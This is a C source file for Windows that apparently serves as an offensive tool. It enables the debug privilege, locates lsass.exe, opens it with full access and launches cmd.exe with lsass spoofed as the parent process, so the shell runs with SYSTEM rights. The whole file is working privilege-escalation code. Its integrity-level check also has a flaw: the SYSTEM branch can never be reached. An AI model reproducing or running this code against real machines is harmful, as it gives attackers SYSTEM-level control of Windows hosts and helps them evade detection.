#include <windows.h>
#include <TlHelp32.h>
#include <stdio.h>
#include <tchar.h>
#include"DebugPriv.h"
#include "ErrorDetails.h"
#include"Relauch.h"

LPCWSTR getIntegrityLevel(HANDLE hProcess) {
    HANDLE hToken;
    OpenProcessToken(hProcess, TOKEN_QUERY, &hToken);

    DWORD cbTokenIL = 0;
    PTOKEN_MANDATORY_LABEL pTokenIL = NULL;
    GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &cbTokenIL);
    pTokenIL = (TOKEN_MANDATORY_LABEL*)LocalAlloc(LPTR, cbTokenIL);
    GetTokenInformation(hToken, TokenIntegrityLevel, pTokenIL, cbTokenIL, &cbTokenIL);

    DWORD dwIntegrityLevel = *GetSidSubAuthority(pTokenIL->Label.Sid, 0);

    if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID) {
        return L"HIGH";
    }
    else if (dwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID) {
        return L"SYSTEM";
    }
}

DWORD getPPID(LPCWSTR processName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);

    if (Process32First(snapshot, &process)) {
        do {
            if (!wcscmp(process.szExeFile, processName)) {
                HANDLE hProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, process.th32ProcessID);
                if (hProcess) {
                    LPCWSTR integrityLevel = NULL;
                    integrityLevel = getIntegrityLevel(hProcess);
                    if (!wcscmp(integrityLevel, L"SYSTEM")) {
                        break;
                    }
                    if (!wcscmp(integrityLevel, L"HIGH")) {
                        break;
                    }
                }
            }
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    return process.th32ProcessID;
}

int main() {
    if (!EnableDebugAbilityWithChecks()) {
        _tprintf(_T("Could not get Debugging privilege! :(\n"));
        RelaunchSelf();  // To prompt runas Administrator 
        ExitProcess(-1);
    }
    else {
        STARTUPINFOEX si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        SIZE_T attributeSize;

        InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
        si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
        InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);

        LPCWSTR parentProcess = L"lsass.exe";
        DWORD dwParentPID = getPPID(parentProcess);
        printf("dwParentPID %d\n", dwParentPID);
        //DWORD dwParentPID = 744;
        printf("[+] Spoofing %ws (PID: %u) as the parent process.\n", parentProcess, dwParentPID);

        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, dwParentPID);
        if (!hProcess) {
            wchar_t errorMessage[256];
            FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), errorMessage, 255, NULL);
            printf("[!] Failed to get a handle with the following error: %ws\n", errorMessage);
            return -1;
        }
        printf("[+] Got a handle of 0x%p\n", hProcess);

        UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProcess, sizeof(HANDLE), NULL, NULL);

        LPCWSTR spawnProcess = L"C:\\Windows\\System32\\cmd.exe";
        CreateProcess(spawnProcess, NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (STARTUPINFO*)&si, &pi);
        printf("[+] Spawning %ws (PID: %u)\n", spawnProcess, pi.dwProcessId);

        return 0;
    }
}